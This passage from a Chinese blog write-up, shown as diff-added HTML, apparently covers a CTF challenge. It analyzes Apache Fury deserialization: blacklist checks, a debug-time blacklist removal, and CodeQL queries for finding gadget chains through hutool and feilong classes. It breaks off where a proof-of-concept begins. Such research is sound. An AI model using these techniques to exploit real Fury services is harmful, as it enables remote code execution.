+<p>这里会对要序列化的class进行一些<code>检测</code>，然后在调用<code>this.getObjectSerializerClass()</code>获取<code>Serializer的class</code>，这里检测我主要关注了<code>Serializable.class</code>这个点，还有<code>requireJavaSerialization()</code>这个是因为里面有关于<code>Serializable.class</code>的判断，然后发现只要class<code>不是以java开头</code>即使<code>没继承Serializable.class</code>也可以被Fury反序列化，<code>初步推断</code>Fury是可以反序列化<code>没继承Serializable.class</code>的<code>类</code></p>
+<p><img loading="lazy" src="../images/image-20250321094021212.png" alt="image-20250321094021212"  />
+</p>
+<p>然后跟<code>this.getObjectSerializerClass()</code></p>
+<p><img loading="lazy" src="../images/image-20250321095055995.png" alt="image-20250321095055995"  />
+</p>
+<p>先会有一个<code>checkNotInDisallowedList()</code>黑名单检测，后面继续调试</p>
+<p><img loading="lazy" src="../images/image-20250321101717880.png" alt="image-20250321101717880"  />
+</p>
+<p>下面这个地方跟进去</p>
+<p><img loading="lazy" src="../images/image-20250321095322029.png" alt="image-20250321095322029"  />
+</p>
+<p>然后到下面这个<code>classLoader.loadClass</code>，为什么要跟这个地方等下就知道了</p>
+<p><img loading="lazy" src="../images/image-20250321095438668.png" alt="image-20250321095438668"  />
+</p>
+<h2 id="0x02-动态生成的serializer">0x02 动态生成的serializer<a hidden class="anchor" aria-hidden="true" href="#0x02-动态生成的serializer">#</a></h2>
+<p>classloader是<code>ClassLoaderUtils$ByteArrayClassLoader</code>来加载的，然后会到父类的loadClass方法，然后再到下图的<code>findClass()</code> <code>生成class</code></p>
+<p><img loading="lazy" src="../images/image-20250321095929583.png" alt="image-20250321095929583"  />
+</p>
+<p>他这个<code>serializer</code>是<strong>动态生成</strong>，到时候我们调试是<strong>调试不了</strong><code>其read()方法</code>的，而这里我们可以得到<code>其class的byte[]</code>，下面后续的操作，就是通过<code>加载byte[]生成class</code>然后通过<code>反射( newInstance() )</code>得到<code>serializer对象</code></p>
+<p><img loading="lazy" src="../images/image-20250321100453734.png" alt="image-20250321100453734"  />
+</p>
+<p>我们也可以通过这个byte[]生成class文件，查看其代码逻辑</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="o">-</span><span class="n">54</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">70</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">66</span><span class="p">,</span><span class="w"> </span><span class="p">...};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fileOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;test.class&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fileOutputStream</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fileOutputStream</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span></code></pre></div><p>这里我是生成了一个<code>TemplatesImpl.class</code>的<code>serializer</code>（为什么选这个，因为经典纯牛奶）</p>
+<p>在调试那个黑名单检测时，运行下面这个就能绕过那个地方，然后生成我们的<code>serializer</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">DEFAULT_DISALLOWED_LIST_SET</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><p>然后只有<code>this.readAndSetFields</code>里面逻辑能审计下，但是基本上也没看到什么<code>反序列化后对方法的调用</code>也可能是类没选对，但是那个(就是这个class怎么生成这些的，感兴趣的可以再深入分析分析)</p>
+<p><img loading="lazy" src="../images/image-20250321103446792.png" alt="image-20250321103446792"  />
+</p>
+<h2 id="0x03-链子查找">0x03 链子查找<a hidden class="anchor" aria-hidden="true" href="#0x03-链子查找">#</a></h2>
+<p>回到之前的86个read方法，这里我其实想起了<code>hessian反序列化</code>的<code>hashmap</code>，然后我反序列化了一个<code>hashmap</code></p>
+<p>看到下面这里，会先反序列化<code>key</code>和<code>value</code>，然后进行map.put，这里不就能进行利用了么（对象调用）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">hash</span><span class="p">,</span><span class="n">hashcode</span><span class="p">,</span><span class="n">equals都能利用了哇</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250321104749461.png" alt="image-20250321104749461"  />
+</p>
+<p>然后我们在看到<code>HashMapSerializer</code>上面的上面是<strong>继承</strong><code>AbstractMapSerializer</code>，其再继承<code>Serializer</code></p>
+<p>86个read我总不能挨个去看吧，但是我们起点大致可以设置为<code>继承Serializer</code>的<code>read方法</code></p>
+<p><strong>思路</strong> 这里大致就两种吧</p>
+<ul>
+<li>通过read为起点，到sink点</li>
+<li>通过read为起点，到<code>jdk原生反序列化</code>，readobject再到sink点</li>
+</ul>
+<h3 id="sink点">sink点<a hidden class="anchor" aria-hidden="true" href="#sink点">#</a></h3>
+<blockquote>
+<p>source点自然是<code>继承Serializer</code>的<code>read方法</code></p>
+<p>起初是用tabby尝试找链子的，然后感觉tabby找得有点力不从心。然后去折腾ql了,也折腾了会吧。相对来说ql给我的感觉会复杂很多，然后自我感觉这篇文章后面内容不是很好，想着写一半了都，还是完个结吧</p>
+<p>先讲sink点吧，因为跟思路对应些，有点照着答案找链子的意思了（苦笑</p>
+</blockquote>
+<p>这里fury本身自带200+类的过滤，然后出题人又加了一个<code>com.feilong.lib</code>的过滤，所以也能往<code>二次反序列化</code>这个方向想吧</p>
+<p>那也就是先找<code>readObject</code>点了呗</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">定义</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="err">及其子类类型</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">OISFamily</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="n">RefType</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">OISFamily</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="p">.</span><span class="n">hasQualifiedName</span><span class="p">(</span><span class="s2">&#34;java.io&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;ObjectInputStream&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="p">.</span><span class="n">getASupertype</span><span class="o">+</span><span class="p">().</span><span class="n">hasQualifiedName</span><span class="p">(</span><span class="s2">&#34;java.io&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;ObjectInputStream&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">查找所有调用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">MethodCall</span><span class="w"> </span><span class="k">call</span><span class="p">,</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="k">method</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">method</span><span class="p">.</span><span class="n">hasName</span><span class="p">(</span><span class="s2">&#34;readObject&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">method</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">()</span><span class="w"> </span><span class="n">instanceof</span><span class="w"> </span><span class="n">OISFamily</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">call</span><span class="p">.</span><span class="n">getMethod</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">method</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">not</span><span class="w"> </span><span class="k">call</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;%com.feilong.lib%&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">call</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getName</span><span class="p">()</span><span class="o">!=</span><span class="s2">&#34;readObject&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">call</span><span class="p">,</span><span class="w"> </span><span class="k">call</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="k">call</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250425110830846.png" alt="image-20250425110830846"  />
+</p>
+<p>看了下最有机会的是<code>IoUtil</code>和<code>JavaSerializer</code>吧，其他方法不太可能调用到</p>
+<p>然后就去看怎么调用到<code>JavaSerializer</code>，然后我又去把<code>序列化和反序列化</code>的流程又去看了篇，得出调用不了（不在map里，其他点也没发现能调用到的），估计是专门fury.register才行,用来提高兼容性的 感觉www。然后还去想了下能不能从<code>序列化byte[]</code>里面构造出<code>JavaSerializer</code>，让他反序列化去调用</p>
+<p>看了反序列化对byte[]的处理发现不行hh，他<code>map中Serializer</code>，在<code>序列化byte[]</code>里面会存一个<code>索引</code>，反序列化的时候直接去map调用<code>对应索引</code>得到对应的<code>Serializer</code>，而不是map中，会和序列化一样的步骤去<code>newSerializer</code>。所以也操作不了</p>
+<p>那就把点看到<code>IoUtil</code>，然后这里思路就应该先从read想办法往这个点调用了，直接查出来的有很多都是<code>走clone()</code>的。后面看有没有机会再说，先把wp的那条整了，这里一直往上找可以到<code>AbstractConverter#convert</code></p>
+<p>我觉得ql不刻意写，应该还不能通过cb getter那个点(不只是getter)到get触发invoke再到convert吧</p>
+<p>这里就分为两段了，后面这段我就直接找invoke到convertInternal（这里result有很多，就直接先写的invoke的）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">@kind path-problem
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">semmle</span><span class="p">.</span><span class="n">code</span><span class="p">.</span><span class="n">java</span><span class="p">.</span><span class="n">dataflow</span><span class="p">.</span><span class="n">FlowSources</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">GetMethod</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">GetMethod</span><span class="p">()</span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getASupertype</span><span class="o">*</span><span class="p">().</span><span class="n">hasQualifiedName</span><span class="p">(</span><span class="s2">&#34;java.lang.reflect&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;InvocationHandler&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="p">.</span><span class="n">getName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;invoke&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">LookupMethod</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">LookupMethod</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">this</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span><span class="o">=</span><span class="s2">&#34;convert&#34;</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">this</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.AbstractConverter%&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">query</span><span class="w"> </span><span class="n">predicate</span><span class="w"> </span><span class="n">edges</span><span class="p">(</span><span class="k">Method</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">a</span><span class="p">.</span><span class="n">polyCalls</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">GetMethod</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">LookupMethod</span><span class="w"> </span><span class="n">sink</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w"> </span><span class="n">edges</span><span class="o">+</span><span class="p">(</span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">sink</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">sink</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;$@ $@ to $@ $@&#34;</span><span class="w"> </span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="k">source</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="p">,</span><span class="k">source</span><span class="p">.</span><span class="n">getName</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sink</span><span class="p">,</span><span class="n">sink</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></div><p>可以看到这里这条和wp中还挺符合的</p>
+<p><img loading="lazy" src="../images/image-20250424154612513.png" alt="image-20250424154612513"  />
+</p>
+<h3 id="source点">source点<a hidden class="anchor" aria-hidden="true" href="#source点">#</a></h3>
+<p>然后这里找到read到compare就没那么像的了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">@kind path-problem
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">semmle</span><span class="p">.</span><span class="n">code</span><span class="p">.</span><span class="n">java</span><span class="p">.</span><span class="n">dataflow</span><span class="p">.</span><span class="n">FlowSources</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">GetMethod</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">GetMethod</span><span class="p">()</span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">exists</span><span class="p">(</span><span class="k">Method</span><span class="w"> </span><span class="n">m</span><span class="p">,</span><span class="k">Parameter</span><span class="w"> </span><span class="n">p</span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">m</span><span class="p">.</span><span class="n">hasName</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getASupertype</span><span class="o">*</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;org.apache.fury.serializer.Serializer%&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">exists</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">getAnOverride</span><span class="p">())</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">p</span><span class="p">.</span><span class="n">getType</span><span class="p">().(</span><span class="n">RefType</span><span class="p">).</span><span class="n">hasQualifiedName</span><span class="p">(</span><span class="s2">&#34;org.apache.fury.memory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;MemoryBuffer&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">p</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s2">&#34;p0&#34;</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">getCallable</span><span class="p">()</span><span class="w"> </span><span class="k">and</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">LookupMethod</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">LookupMethod</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">exists</span><span class="p">(</span><span class="n">MethodCall</span><span class="w"> </span><span class="n">a</span><span class="o">|</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">a</span><span class="p">.</span><span class="n">getCallee</span><span class="p">().</span><span class="n">getName</span><span class="p">()</span><span class="o">=</span><span class="s2">&#34;getProperty&#34;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">and</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">getCaller</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">query</span><span class="w"> </span><span class="n">predicate</span><span class="w"> </span><span class="n">edges</span><span class="p">(</span><span class="k">Method</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">a</span><span class="p">.</span><span class="n">polyCalls</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">GetMethod</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">LookupMethod</span><span class="w"> </span><span class="n">sink</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w"> </span><span class="n">edges</span><span class="o">+</span><span class="p">(</span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">sink</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;com.feilong.core.util.comparator.PropertyComparator%&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">sink</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;$@ $@ to $@ $@&#34;</span><span class="w"> </span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="k">source</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="p">,</span><span class="k">source</span><span class="p">.</span><span class="n">getName</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sink</span><span class="p">,</span><span class="n">sink</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250424160833113.png" alt="image-20250424160833113"  />
+</p>
+<p><img loading="lazy" src="../images/image-20250425095603887.png" alt="image-20250425095603887"  />
+</p>
+<p>可以看到是有偏差的，然后这里read方法有很多，其实很多可以排除，因为要<code>调用</code>到才行 &amp; 能<code>储存对象</code>才行（比如map）这种，<strong>因为不能储存对象的话，你后续gadget也无法展开</strong>（因为你<code>起点类</code>最少要满足能<code>还原</code>一个<code>对象</code>，并使这个对象<code>调用</code>一个<code>方法</code>吧）。然后我看了大多结果，很多都可以排除掉，也就是可以去看他<code>定义了的mapSerializer</code>中有那些，然后看class类型进行筛选，然后对codeql source进行限制。然后还有很多read后面也是指向<code>CollectionSerializer#read</code>，所以这个点多少也会去研究下。</p>
+<p>然后正常思路肯定不会直接就找compare方法嘛（纯照答案找），思路的话我觉得</p>
+<ul>
+<li>可以有个<code>sinkmethod</code>集合，然后找这个集合（就是误报很多就是了hh）</li>
+<li>edges几层，然后看这几层里面有那些<code>函数</code>可以利用，但是这个误报就太太大了</li>
+</ul>
+<p>然后这里compare不是没找到对应的链子，我去看了下jdk的类，codeql是怎么处理的，然后发现是调用的<code>class</code>文件，而且感觉节点也出了问题，比如<code>siftUpUsingComparator</code>这个方法就找不到。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">RefType</span><span class="w"> </span><span class="n">queueType</span><span class="p">,</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="n">m</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getASupertype</span><span class="o">*</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;java.util.PriorityQueue%&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">m</span><span class="p">,</span><span class="n">m</span><span class="p">.</span><span class="n">getLocation</span><span class="p">().</span><span class="n">getFile</span><span class="p">().</span><span class="n">getAbsolutePath</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></div><p>然后我去找个了<code>jdk的源码</code>一起加到<code>数据库</code>里，但是生成要很久，而且很卡（我是直接反编译，然后<code>codeql database create db-name --language=java --source-root=./sources --build-mode=none</code>，生成的）<strong>有好的方法，希望师傅们安利下hh（win10）</strong></p>
+<p>生成之后原本的没找出来，treeMap的找出来，hhh。</p>
+<p><img loading="lazy" src="../images/image-20250427165851303.png" alt="image-20250427165851303"  />
+</p>
+<p>然后用treemap改了下开头是可以打的，构造有些小问题，防止生成的时候触发poc，也是用最<code>暴力</code>的反射解决了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">tostring_test</span><span class="p">;</span><span class="w">
